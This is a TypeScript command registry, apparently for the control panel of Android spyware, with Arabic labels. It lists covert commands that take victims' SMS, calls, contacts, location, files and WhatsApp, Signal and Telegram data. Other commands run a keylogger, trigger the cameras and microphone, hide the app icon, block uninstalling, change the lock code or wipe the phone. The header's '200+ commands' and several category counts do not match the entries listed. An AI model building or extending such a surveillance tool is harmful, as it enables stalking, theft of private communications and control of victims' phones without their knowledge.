// Command Registry - 200+ Commands organized by category

export interface CommandInfo {
  cat: string;
  cmd: string;
  desc: string;
  emoji: string;
}

export type CommandRegistry = Record<string, CommandInfo>;

export const COMMAND_REGISTRY: CommandRegistry = {
  // Data Collection (20)
  sms: { cat: "data", cmd: "get_sms", desc: "جلب الرسائل SMS", emoji: "📲" },
  calls: { cat: "data", cmd: "get_calls", desc: "جلب سجل المكالمات", emoji: "📞" },
  contacts: { cat: "data", cmd: "get_contacts", desc: "جلب جهات الاتصال", emoji: "📇" },
  location: { cat: "data", cmd: "get_location", desc: "جلب الموقع الجغرافي", emoji: "📍" },
  notifications: { cat: "data", cmd: "get_notifications", desc: "جلب الإشعارات", emoji: "🔔" },
  apps: { cat: "data", cmd: "get_apps", desc: "جلب التطبيقات المثبتة", emoji: "📱" },
  info: { cat: "data", cmd: "get_info", desc: "معلومات الجهاز", emoji: "ℹ️" },
  battery: { cat: "data", cmd: "get_battery", desc: "حالة البطارية", emoji: "🔋" },
  gallery: { cat: "data", cmd: "get_gallery", desc: "المعرض", emoji: "🖼️" },
  clipboard: { cat: "data", cmd: "get_clipboard", desc: "الحافظة", emoji: "📋" },
  all_data: { cat: "data", cmd: "get_all", desc: "جميع البيانات", emoji: "📥" },
  wifi_info: { cat: "data", cmd: "get_wifi_info", desc: "معلومات الواي فاي", emoji: "📶" },
  bluetooth_devices: { cat: "data", cmd: "get_info", desc: "أجهزة البلوتوث", emoji: "🔵" },
  network_info: { cat: "data", cmd: "get_network_info", desc: "معلومات الشبكة", emoji: "🌐" },
  sim_info: { cat: "data", cmd: "get_sim_info", desc: "معلومات الشريحة", emoji: "📱" },
  storage_info: { cat: "data", cmd: "get_storage_info", desc: "معلومات التخزين", emoji: "💾" },
  installed_apps: { cat: "data", cmd: "get_installed_apps", desc: "التطبيقات المثبتة", emoji: "📦" },
  running_apps: { cat: "data", cmd: "get_running_apps", desc: "التطبيقات النشطة", emoji: "⚡" },
  calendar: { cat: "data", cmd: "get_calendar", desc: "التقويم", emoji: "📅" },
  browser_history: { cat: "data", cmd: "get_browser_history", desc: "سجل المتصفح", emoji: "🌍" },

  // Social Media (15)
  whatsapp: { cat: "social", cmd: "get_whatsapp", desc: "واتساب", emoji: "💬" },
  telegram_app: { cat: "social", cmd: "get_telegram", desc: "تليجرام", emoji: "✈️" },
  instagram: { cat: "social", cmd: "get_instagram", desc: "انستجرام", emoji: "📷" },
  messenger: { cat: "social", cmd: "get_messenger", desc: "ماسنجر", emoji: "📘" },
  snapchat: { cat: "social", cmd: "get_snapchat", desc: "سناب شات", emoji: "👻" },
  tiktok: { cat: "social", cmd: "get_tiktok", desc: "تيك توك", emoji: "🎵" },
  twitter: { cat: "social", cmd: "get_twitter", desc: "تويتر / X", emoji: "🐦" },
  viber: { cat: "social", cmd: "get_viber", desc: "فايبر", emoji: "💜" },
  signal: { cat: "social", cmd: "get_signal", desc: "سيجنال", emoji: "🟢" },
  facebook: { cat: "social", cmd: "get_facebook", desc: "فيسبوك", emoji: "📘" },
  whatsapp_status: { cat: "social", cmd: "get_whatsapp", desc: "حالات واتساب", emoji: "📝" },
  telegram_channels: { cat: "social", cmd: "get_telegram", desc: "قنوات تليجرام", emoji: "📺" },
  instagram_stories: { cat: "social", cmd: "get_instagram", desc: "قصص انستجرام", emoji: "📸" },
  youtube: { cat: "social", cmd: "get_tiktok", desc: "يوتيوب", emoji: "▶️" },

  // Remote Control (40)
  ping: { cat: "control", cmd: "ping", desc: "فحص الاتصال", emoji: "📡" },
  vibrate: { cat: "control", cmd: "vibrate", desc: "اهتزاز", emoji: "📳" },
  ring: { cat: "control", cmd: "ring", desc: "رنين", emoji: "🔔" },
  screenshot: { cat: "control", cmd: "screenshot", desc: "لقطة شاشة", emoji: "📸" },
  front_camera: { cat: "control", cmd: "front_camera", desc: "كاميرا أمامية", emoji: "📷" },
  back_camera: { cat: "control", cmd: "back_camera", desc: "كاميرا خلفية", emoji: "📷" },
  record_audio: { cat: "control", cmd: "record_audio", desc: "تسجيل صوتي", emoji: "🎙️" },
  record_video: { cat: "control", cmd: "record_screen", desc: "تسجيل فيديو", emoji: "🎬" },
  lock_phone: { cat: "control", cmd: "lock_phone", desc: "قفل الهاتف", emoji: "🔒" },
  unlock_phone: { cat: "control", cmd: "unlock_phone", desc: "فتح الهاتف", emoji: "🔓" },
  reboot: { cat: "control", cmd: "reboot", desc: "إعادة تشغيل", emoji: "🔄" },
  shutdown: { cat: "control", cmd: "shutdown", desc: "إيقاف التشغيل", emoji: "⏻" },
  set_volume: { cat: "control", cmd: "set_volume", desc: "تعيين الصوت", emoji: "🔊" },
  set_brightness: { cat: "control", cmd: "set_brightness", desc: "تعيين السطوع", emoji: "☀️" },
  enable_wifi: { cat: "control", cmd: "enable_wifi", desc: "تشغيل الواي فاي", emoji: "📶" },
  disable_wifi: { cat: "control", cmd: "disable_wifi", desc: "إيقاف الواي فاي", emoji: "📵" },
  enable_bluetooth: { cat: "control", cmd: "enable_bluetooth", desc: "تشغيل البلوتوث", emoji: "🔵" },
  disable_bluetooth: { cat: "control", cmd: "disable_bluetooth", desc: "إيقاف البلوتوث", emoji: "❌" },
  enable_mobile_data: { cat: "control", cmd: "enable_mobile_data", desc: "تشغيل بيانات الجوال", emoji: "📶" },
  disable_mobile_data: { cat: "control", cmd: "disable_mobile_data", desc: "إيقاف بيانات الجوال", emoji: "📵" },
  enable_hotspot: { cat: "control", cmd: "enable_hotspot", desc: "تشغيل نقطة الاتصال", emoji: "📡" },
  disable_hotspot: { cat: "control", cmd: "disable_hotspot", desc: "إيقاف نقطة الاتصال", emoji: "📵" },
  airplane_on: { cat: "control", cmd: "airplane_on", desc: "وضع الطيران - تشغيل", emoji: "✈️" },
  airplane_off: { cat: "control", cmd: "airplane_off", desc: "وضع الطيران - إيقاف", emoji: "📱" },
  torch_on: { cat: "control", cmd: "torch_on", desc: "تشغيل الكشاف", emoji: "🔦" },
  torch_off: { cat: "control", cmd: "torch_off", desc: "إطفاء الكشاف", emoji: "🔦" },
  play_sound: { cat: "control", cmd: "play_sound", desc: "تشغيل صوت", emoji: "🔊" },
  speak_text: { cat: "control", cmd: "speak_text", desc: "نطق نص", emoji: "🗣️" },
  open_url: { cat: "control", cmd: "open_url", desc: "فتح رابط", emoji: "🌐" },
  send_sms: { cat: "control", cmd: "send_sms", desc: "إرسال رسالة SMS", emoji: "📲" },
  make_call: { cat: "control", cmd: "make_call", desc: "إجراء مكالمة", emoji: "📞" },
  block_number: { cat: "control", cmd: "block_number", desc: "حظر رقم", emoji: "🚫" },
  unblock_number: { cat: "control", cmd: "unblock_number", desc: "إلغاء حظر رقم", emoji: "✅" },

  // App Management (20)
  open_app: { cat: "apps", cmd: "open_app", desc: "فتح تطبيق", emoji: "📱" },
  close_app: { cat: "apps", cmd: "close_app", desc: "إغلاق تطبيق", emoji: "❌" },
  install_app: { cat: "apps", cmd: "install_app", desc: "تثبيت تطبيق", emoji: "📥" },
  uninstall_app: { cat: "apps", cmd: "uninstall_app", desc: "حذف تطبيق", emoji: "🗑️" },
  block_app: { cat: "apps", cmd: "block_app", desc: "حظر تطبيق", emoji: "🚫" },
  unblock_app: { cat: "apps", cmd: "unblock_app", desc: "إلغاء حظر تطبيق", emoji: "✅" },
  clear_app_data: { cat: "apps", cmd: "clear_app_data", desc: "مسح بيانات تطبيق", emoji: "🧹" },
  force_stop_app: { cat: "apps", cmd: "force_stop_app", desc: "إيقاف قسري", emoji: "⛔" },
  app_info: { cat: "apps", cmd: "get_info", desc: "معلومات تطبيق", emoji: "ℹ️" },
  screen_time: { cat: "apps", cmd: "get_app_usage", desc: "وقت الشاشة", emoji: "⏱️" },

  // File Management (25)
  list_files: { cat: "files", cmd: "list_files", desc: "عرض الملفات", emoji: "📂" },
  get_file: { cat: "files", cmd: "get_file", desc: "جلب ملف", emoji: "📄" },
  download_file: { cat: "files", cmd: "get_file", desc: "تحميل ملف", emoji: "⬇️" },
  list_downloads: { cat: "files", cmd: "list_files", desc: "مجلد التحميلات", emoji: "📥" },
  list_dcim: { cat: "files", cmd: "list_files", desc: "مجلد DCIM", emoji: "📸" },
  list_music: { cat: "files", cmd: "list_files", desc: "مجلد الموسيقى", emoji: "🎵" },
  list_videos: { cat: "files", cmd: "list_files", desc: "مجلد الفيديوهات", emoji: "🎬" },
  list_documents: { cat: "files", cmd: "list_files", desc: "مجلد المستندات", emoji: "📁" },
  list_whatsapp: { cat: "files", cmd: "list_files", desc: "ملفات واتساب", emoji: "💬" },
  delete_file: { cat: "files", cmd: "delete_file", desc: "حذف ملف", emoji: "🗑️" },
  rename_file: { cat: "files", cmd: "rename_file", desc: "إعادة تسمية ملف", emoji: "✏️" },
  copy_file: { cat: "files", cmd: "copy_file", desc: "نسخ ملف", emoji: "📋" },
  move_file: { cat: "files", cmd: "move_file", desc: "نقل ملف", emoji: "📦" },
  create_folder: { cat: "files", cmd: "create_folder", desc: "إنشاء مجلد", emoji: "📁" },
  search_files: { cat: "files", cmd: "search_files", desc: "بحث في الملفات", emoji: "🔍" },
  recent_files: { cat: "files", cmd: "recent_files", desc: "الملفات الأخيرة", emoji: "🕐" },

  // Security & Admin (15)
  wipe_data: { cat: "security", cmd: "wipe_data", desc: "مسح البيانات", emoji: "💣" },
  factory_reset: { cat: "security", cmd: "factory_reset", desc: "إعادة ضبط المصنع", emoji: "⚠️" },
  show_app: { cat: "security", cmd: "show_app", desc: "إظهار أيقونة التطبيق", emoji: "👁️" },
  hide_app: { cat: "security", cmd: "hide_app", desc: "إخفاء أيقونة التطبيق", emoji: "🙈" },
  change_passcode: { cat: "security", cmd: "change_passcode", desc: "تغيير رمز القفل", emoji: "🔑" },
  anti_uninstall_on: { cat: "security", cmd: "anti_uninstall_on", desc: "الحماية من الحذف - تشغيل", emoji: "🛡️" },
  anti_uninstall_off: { cat: "security", cmd: "anti_uninstall_off", desc: "الحماية من الحذف - إيقاف", emoji: "⛔" },

  // Monitoring (20)
  keylogger_start: { cat: "monitor", cmd: "keylogger_start", desc: "بدء تسجيل المفاتيح", emoji: "⌨️" },
  keylogger_stop: { cat: "monitor", cmd: "keylogger_stop", desc: "إيقاف تسجيل المفاتيح", emoji: "⏹️" },
  get_keylogger: { cat: "monitor", cmd: "get_keylogger", desc: "جلب بيانات لوحة المفاتيح", emoji: "📥" },
  screen_record_start: { cat: "monitor", cmd: "screen_record_start", desc: "بدء تسجيل الشاشة", emoji: "🔴" },
  screen_record_stop: { cat: "monitor", cmd: "stop_screen", desc: "إيقاف تسجيل الشاشة", emoji: "⏹️" },
  location_live: { cat: "monitor", cmd: "location_live", desc: "تتبع مباشر", emoji: "🗺️" },
  location_stop: { cat: "monitor", cmd: "location_stop", desc: "إيقاف التتبع", emoji: "⏹️" },
  location_history: { cat: "monitor", cmd: "get_location", desc: "سجل المواقع", emoji: "📜" },
  sms_monitor: { cat: "monitor", cmd: "get_sms", desc: "مراقبة الرسائل", emoji: "📲" },
  call_monitor: { cat: "monitor", cmd: "get_calls", desc: "مراقبة المكالمات", emoji: "📞" },

  // System Settings (15)
  set_language: { cat: "syssettings", cmd: "set_language", desc: "تعيين اللغة", emoji: "🌐" },
  set_timezone: { cat: "syssettings", cmd: "set_timezone", desc: "تعيين المنطقة الزمنية", emoji: "🕐" },
  set_alarm: { cat: "syssettings", cmd: "set_alarm", desc: "تعيين منبه", emoji: "⏰" },
  enable_dev_mode: { cat: "syssettings", cmd: "enable_dev_mode", desc: "تشغيل وضع المطور", emoji: "🔧" },
  disable_dev_mode: { cat: "syssettings", cmd: "disable_dev_mode", desc: "إيقاف وضع المطور", emoji: "❌" },
  enable_usb_debug: { cat: "syssettings", cmd: "enable_usb_debug", desc: "تشغيل تصحيح USB", emoji: "🔌" },
  disable_usb_debug: { cat: "syssettings", cmd: "disable_usb_debug", desc: "إيقاف تصحيح USB", emoji: "❌" },
  dns_change: { cat: "syssettings", cmd: "dns_change", desc: "تغيير DNS", emoji: "🌐" },
  nfc_on: { cat: "syssettings", cmd: "nfc_on", desc: "تشغيل NFC", emoji: "📡" },
  nfc_off: { cat: "syssettings", cmd: "nfc_off", desc: "إيقاف NFC", emoji: "❌" },
};

export const COMMAND_CATEGORIES: Record<string, { label: string; icon: string }> = {
  data: { label: "جمع البيانات", icon: "📊" },
  social: { label: "التواصل الاجتماعي", icon: "🌐" },
  control: { label: "التحكم عن بعد", icon: "🎮" },
  apps: { label: "إدارة التطبيقات", icon: "📦" },
  files: { label: "إدارة الملفات", icon: "📂" },
  security: { label: "الأمان", icon: "🔒" },
  monitor: { label: "المراقبة", icon: "🔍" },
  syssettings: { label: "إعدادات النظام", icon: "⚙️" },
};

export function getCommandsByCategory(category: string): CommandInfo[] {
  return Object.entries(COMMAND_REGISTRY)
    .filter(([, info]) => info.cat === category)
    .map(([name, info]) => ({ ...info, name }));
}

export function getTotalCommands(): number {
  return Object.keys(COMMAND_REGISTRY).length;
}
